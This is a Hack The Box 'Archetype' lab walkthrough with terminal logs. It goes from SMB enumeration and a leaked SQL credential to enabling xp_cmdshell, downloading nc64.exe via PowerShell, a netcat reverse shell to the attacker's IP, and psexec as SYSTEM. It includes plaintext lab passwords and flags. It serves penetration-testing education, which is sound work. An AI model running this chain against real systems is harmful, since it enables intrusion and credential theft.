#protocols #mssql #smb #powershell #reconnaissance #remote-code-execution #clear-text-credentials #information-disclosure #anonymous-access 

# 0. Theory

>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.
>*/the lib's author*


# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-b5tzs8mew9]─[~]
	└──╼ [★]$ ping 10.129.95.187 -c 4
	PING 10.129.95.187 (10.129.95.187) 56(84) bytes of data.
	64 bytes from 10.129.95.187: icmp_seq=1 ttl=127 time=8.36 ms
	64 bytes from 10.129.95.187: icmp_seq=2 ttl=127 time=8.17 ms
	64 bytes from 10.129.95.187: icmp_seq=3 ttl=127 time=8.00 ms
	64 bytes from 10.129.95.187: icmp_seq=4 ttl=127 time=7.89 ms
	
	--- 10.129.95.187 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3002ms
	rtt min/avg/max/mdev = 7.890/8.105/8.362/0.178 ms

# 2. Enumeration

Starting off with the usual `nmap` scan:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-b5tzs8mew9]─[~]
	└──╼ [★]$ nmap 10.129.95.187 -sC -sV
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 05:00 CDT
	Nmap scan report for 10.129.95.187
	Host is up (0.011s latency).
	Not shown: 996 closed tcp ports (reset)
	PORT     STATE SERVICE      VERSION
	135/tcp  open  msrpc        Microsoft Windows RPC
	139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
	1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
	| ms-sql-ntlm-info: 
	|   10.129.95.187:1433: 
	|     Target_Name: ARCHETYPE
	|     NetBIOS_Domain_Name: ARCHETYPE
	|     NetBIOS_Computer_Name: ARCHETYPE
	|     DNS_Domain_Name: Archetype
	|     DNS_Computer_Name: Archetype
	|_    Product_Version: 10.0.17763
	| ms-sql-info: 
	|   10.129.95.187:1433: 
	|     Version: 
	|       name: Microsoft SQL Server 2017 RTM
	|       number: 14.00.1000.00
	|       Product: Microsoft SQL Server 2017
	|       Service pack level: RTM
	|       Post-SP patches applied: false
	|_    TCP port: 1433
	| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
	| Not valid before: 2024-09-28T09:59:01
	|_Not valid after:  2054-09-28T09:59:01
	|_ssl-date: 2024-09-28T10:01:01+00:00; 0s from scanner time.
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb-os-discovery: 
	|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
	|   Computer name: Archetype
	|   NetBIOS computer name: ARCHETYPE\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2024-09-28T03:00:55-07:00
	| smb2-time: 
	|   date: 2024-09-28T10:00:56
	|_  start_date: N/A
	|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds


We can see that SMB ports are open and that a `Microsoft SQL Server 2017` service is running on `port 1433`.
Let's enumerate the SMB service with the `smbclient` tool using the following options:

	-N : No password
	-L : This option allows you to look at what services are available on a server

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-b5tzs8mew9]─[~]
	└──╼ [★]$ smbclient -N -L \\\\10.129.95.187\\
	
		Sharename       Type      Comment
		---------       ----      -------
		ADMIN$          Disk      Remote Admin
		backups         Disk      
		C$              Disk      Default share
		IPC$            IPC       Remote IPC
	Reconnecting with SMB1 for workgroup listing.
	do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
	Unable to connect with SMB1 -- no workgroup available

We have found some interesting shares. `ADMIN$` and `C$` cannot be accessed, but we can enumerate further on the `backups` share.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-b5tzs8mew9]─[~]
	└──╼ [★]$ smbclient -N \\\\10.129.95.187\\backups
	Try "help" to get a list of possible commands.
	smb: \> dir
	  .                                   D        0  Mon Jan 20 06:20:57 2020
	  ..                                  D        0  Mon Jan 20 06:20:57 2020
	  prod.dtsConfig                     AR      609  Mon Jan 20 06:23:02 2020
	
			5056511 blocks of size 4096. 2622487 blocks available
	smb: \> get prod.dtsConfig 
	getting file \prod.dtsConfig of size 609 as prod.dtsConfig (17.5 KiloBytes/sec) (average 17.5 KiloBytes/sec)

After a quick sniffing around we discover a file on this share which we can download to investigate its content.
The file will be saved in the directory from which we launched the SMB session.

The content of the config file:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-b5tzs8mew9]─[~]
	└──╼ [★]$ cat prod.dtsConfig 
	<DTSConfiguration>
	    <DTSConfigurationHeading>
	        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
	    </DTSConfigurationHeading>
	    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
	        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
	    </Configuration>
	</DTSConfiguration>

By reviewing the content of this configuration file, we spot in cleartext the password of the user `sql_svc`, which is `M3g4c0rp123`, for the host `ARCHETYPE`. With the provided credentials we just need a way to connect and authenticate to the MSSQL server. [Impacket](https://github.com/SecureAuthCorp/impacket) tool includes a valuable python script called `mssqlclient.py` which offers such functionality.

A quick installation guide for `impacket`:

	git clone https://github.com/SecureAuthCorp/impacket.git
	cd impacket
	pip3 install .
	# OR:
	sudo python3 setup.py install
	# In case you are missing some modules:
	pip3 install -r requirements.txt

And in case we wouldn't have pip3 installed:
`sudo apt install python3 python3-pip`

Now, to learn more about the tool and specifically of the mssqlclient.py script:

	cd impacket/examples/
	python3 mssqlclient.py -h

We can try to connect to the MSSQL server by using impacket's mssqlclient.py script along with the following flags:

	-windows-auth : this flag is specified to use Windows Authentication

	python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-b5tzs8mew9]─[~/impacket/examples]
	└──╼ [★]$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
	Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
	
	Password:
	[*] Encryption required, switching to TLS
	[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
	[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
	[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
	[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
	[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
	[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
	[!] Press help for extra shell commands
	SQL (ARCHETYPE\sql_svc  dbo@master)> 

After providing the password (`M3g4c0rp123`) we read in the downloaded config file earlier, we are in.


# 3. Foothold

We can check the help page for the SQL shell by typing the `help` command.
Two useful articles on MSSQL Server exploitations:
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

As a first step, we check our role on the server. This command can be found in the cheatsheet above:

	SELECT is_srvrolemember('sysadmin');

The output `1` translates to `True`:

	SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
	    
	-   
	1

In the cheatsheets above, we can also find how to set up the command execution through the `xp_cmdshell`:

	EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
	EXEC sp_configure 'show advanced options', 1; — priv
	RECONFIGURE; — priv
	EXEC sp_configure 'xp_cmdshell', 1; — priv
	RECONFIGURE; — priv

First it is suggested to check if the `xp_cmdshell` is already activated by issuing the first command:
`EXEC xp_cmdshell 'net user';`

	SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net user';
	ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

It is not, so we have to proceed with the activation of `xp_cmdshell` with the script below:

	EXEC sp_configure 'show advanced options', 1;
	RECONFIGURE;
	sp_configure; - Enabling the sp_configure as stated in the above error message
	EXEC sp_configure 'xp_cmdshell', 1;
	RECONFIGURE;

After executing all of the commands above, we can see that the `xp_cmdshell` is now activated:

	SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net user';
	output                                                                          
	------------------------------------------------------------------------------- 
	NULL                                                                            
	
	User accounts for \\ARCHETYPE                                                   
	
	NULL                                                                            
	
	------------------------------------------------------------------------------- 
	
	Administrator            DefaultAccount           Guest                         
	
	sql_svc                  WDAGUtilityAccount                                     
	
	The command completed successfully.                                             
	
	NULL                                                                            
	
	NULL                                                                            


And now we can execute system commands:

	SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
	output              
	-----------------   
	archetype\sql_svc   
	
	NULL

Now, we will attempt to get a stable reverse shell. We will upload the `nc64.exe` binary to the target machine and execute an interactive `cmd.exe` process on our listening port.

The binary is available [here](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------)

We navigate to the folder where we placed the binary and then start the simple HTTP server, then the netcat listener in a different tab by using the following commands:

	# sudo apt update
	# sudo apt upgrade python3
	sudo python3 -m http.server 80
	sudo nc -lvnp 443

In order to upload the binary in the target system, we need to find the appropriate folder for that. We will be using `PowerShell` for the following tasks since it gives us much more features then the regular command prompt. In order to use it, we will have to specify it each time we want to execute it until we get the reverse shell. To do that, we will use the following syntax: `powershell -c` command.

The `-c` flag instructs the powershell to execute the command.

We can see the starting directory by running the following command:
`xp_cmdshell "cd"`

	SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "cd"
	output                
	-------------------   
	C:\Windows\system32   
	
	NULL                  


We found the folder where we have to place the binary. To do that, we will use the `wget` alias within PowerShell (`wget` is actually just an alias for `Invoke-WebRequest`):
`xp_cmdshell "powershell -c pwd"`

	SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c pwd"
	output                
	-------------------   
	NULL                  
	
	Path                  
	
	----                  
	
	C:\Windows\system32   
	
	NULL                  
	
	NULL                  
	
	NULL                  

As a user `archetype\sql_svc`, we don't have enough privileges to upload files in a system directory and only user `Administrator` can perform actions with higher privileges. We need to change the current working directory somewhere in the home directory of our user where it will be possible to write. After a quick enumeration we found that Downloads is working perfectly for us to place our binary. In order to do that, we are going to use the `wget` tool within PowerShell:

	xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.118/nc64.exe -outfile nc64.exe"

(As I set up the http server to serve on port 81, I explicitly define the port in the address.
Also, we can check our IPv4 address with the `ip a` command.)

	SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.118:81/nc64.exe -outfile nc64.exe"
	output   
	------   
	NULL     

And we can verify that the http server served the binary to the target machine by checking the other terminal window where the service is running:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-rolbarnya2]─[~/Downloads]
	└──╼ [★]$ sudo python3 -m http.server 81
	Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
	10.129.95.187 - - [29/Sep/2024 07:43:45] "GET /nc64.exe HTTP/1.1" 200 -

Now, we can bind the `cmd.exe` through the `nc` to our listener:

`xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.118 443"`

Finally, we can look back at the other terminal window where we are running the netcat listener, to confirm that we received a reverse shell from the target and gained a foothold to the system.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-rolbarnya2]─[~]
	└──╼ [★]$ sudo nc -lvnp 443
	listening on [any] 443 ...
	connect to [10.10.14.118] from (UNKNOWN) [10.129.95.187] 49678
	Microsoft Windows [Version 10.0.17763.2061]
	(c) 2018 Microsoft Corporation. All rights reserved.
	
	C:\Users\sql_svc\Downloads>whoami
	whoami
	archetype\sql_svc
	
	C:\Users\sql_svc\Downloads>

As with most HTB VMs, the flag is located in the user's Desktop.

	C:\Users\sql_svc\Desktop>dir
	dir
	 Volume in drive C has no label.
	 Volume Serial Number is 9565-0B4F
	
	 Directory of C:\Users\sql_svc\Desktop
	
	01/20/2020  06:42 AM    <DIR>          .
	01/20/2020  06:42 AM    <DIR>          ..
	02/25/2020  07:37 AM                32 user.txt
	               1 File(s)             32 bytes
	               2 Dir(s)  10,723,078,144 bytes free
	
	C:\Users\sql_svc\Desktop>more user.txt
	more user.txt
	3e7b102e78218e935bf3f4951fec21a3

**User flag exfiltrated**: `3e7b102e78218e935bf3f4951fec21a3`

## Windows Privilege Escalation - Escalating to Admin role

For privilege escalation, we are going to use a tool called `winPEAS`, which can automate a big part of the enumeration process in the target system.

WinPEAS can be downloaded from [here](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe).
We will transfer it to the target system by using once more the Python HTTP server:
`python3 -m http.server 80` (or port `81` if `80` is already taken and being used by other services and we don't want to bother looking for them and killing them) 

On the target machine, we will execute the `wget` command in order to download the program from our system. The file will be downloaded in the directory from which the `wget` command was run. We will use powershell for all our commands:
`powershell wget http://10.10.14.118:81/winPEASx64.exe -outfile winPEASx64.exe`

To verify that the target machine was able to download the binary, we check back at the terminal running the http server:

	─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-rolbarnya2]─[~/Downloads]
	└──╼ [★]$ sudo python3 -m http.server 81
	Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
	10.129.95.187 - - [29/Sep/2024 07:43:45] "GET /nc64.exe HTTP/1.1" 200 -
	10.129.95.187 - - [29/Sep/2024 08:04:58] "GET /winPEASx64.exe HTTP/1.1" 200 -

And  we can check the target's Downloads folder:

	C:\Users\sql_svc\Downloads>dir 
	dir
	 Volume in drive C has no label.
	 Volume Serial Number is 9565-0B4F
	
	 Directory of C:\Users\sql_svc\Downloads
	
	09/29/2024  06:09 AM    <DIR>          .
	09/29/2024  06:09 AM    <DIR>          ..
	09/29/2024  05:43 AM            45,272 nc64.exe
	09/29/2024  06:09 AM                 0 winPEASx64.exe
	               2 File(s)         45,272 bytes
	               2 Dir(s)  10,721,767,424 bytes free

We execute the the WinPEAS binary.

	C:\Users\sql_svc\Downloads> .\winPEASx64.exe
 
 output:
 
	<*** SNIP ***>
	����������͹ PowerShell Settings
	    PowerShell v2 Version: 2.0
	    PowerShell v5 Version: 5.1.17763.1
	    PowerShell Core Version: 
	    Transcription Settings: 
	    Module Logging Settings: 
	    Scriptblock Logging Settings: 
	    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
	    PS history size: 79B
	    
	...
	
	����������͹ Current Token privileges
	    SeAssignPrimaryTokenPrivilege: DISABLED
	    SeIncreaseQuotaPrivilege: DISABLED
	    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
	    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
	    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
	    SeIncreaseWorkingSetPrivilege: DISABLED
	
	...
	
	����������͹ Analyzing Windows Files Files (limit 70)
		C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
	    C:\Users\Default\NTUSER.DAT
	    C:\Users\sql_svc\NTUSER.DAT
    
    ...

From the output we can observer that we have `SeImpersonatePrivilege` (more information can be found [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege)), which is also vulnerable to [juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato). However, we can first check the two existing files where credentials could be possible to be found.

As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. To do that, we will read the PowerShell history file, which is the equivalent of `.bash_history` for Linux systems. The file `ConsoleHost_history.txt` can be located in the directory `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\`.

We navigate to the folder where the PowerShell history is stored:

	C:\Users\sql_svc>cd AppData
	cd AppData
	C:\Users\sql_svc\AppData>cd Roaming\Microsoft\Windows\PowerShell\PSReadLine
	cd Roaming\Microsoft\Windows\PowerShell\PSReadLine
	C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>dir
	dir
	 Volume in drive C has no label.
	 Volume Serial Number is 9565-0B4F
	
	 Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
	
	01/20/2020  06:04 AM    <DIR>          .
	01/20/2020  06:04 AM    <DIR>          ..
	03/17/2020  02:36 AM                79 ConsoleHost_history.txt
	               1 File(s)             79 bytes
	               2 Dir(s)  10,715,648,000 bytes free

We can read the command log file with the `type` command:

	C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
	type ConsoleHost_history.txt
	net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
	exit

And we got in cleartext the password for the `Administrator` user which is `MEGACORP_4dm1n!!`

We can now use the tool `psexec.py` again from the Impacket suite to get a shell as the administrator:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.41]─[scrage@htb-qxoqm2neih]─[~/impacket/examples]
	└──╼ [★]$ python3 psexec.py administrator@10.129.95.187
	Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
	
	Password:
	[*] Requesting shares on 10.129.95.187.....
	[*] Found writable share ADMIN$
	[*] Uploading file tYOcOXbf.exe
	[*] Opening SVCManager on 10.129.95.187.....
	[*] Creating service FcTB on 10.129.95.187.....
	[*] Starting service FcTB.....
	[!] Press help for extra shell commands
	Microsoft Windows [Version 10.0.17763.2061]
	(c) 2018 Microsoft Corporation. All rights reserved.
	
	C:\Windows\system32> whoami
	nt authority\system

Let's exfiltrate the root flag as well from the Desktop folder.

	C:\Users\Administrator\Desktop> dir
	 Volume in drive C has no label.
	 Volume Serial Number is 9565-0B4F
	
	 Directory of C:\Users\Administrator\Desktop
	
	07/27/2021  02:30 AM    <DIR>          .
	07/27/2021  02:30 AM    <DIR>          ..
	02/25/2020  07:36 AM                32 root.txt
	               1 File(s)             32 bytes
	               2 Dir(s)  10,715,590,656 bytes free
	
	C:\Users\Administrator\Desktop> type root.txt
	b91ccec3305e98240082d4474b848528

Root flag exfiltrated: `b91ccec3305e98240082d4474b848528`



https://www.hackthebox.com/achievement/machine/2057492/287
![[Pasted image 20241006191027.png]]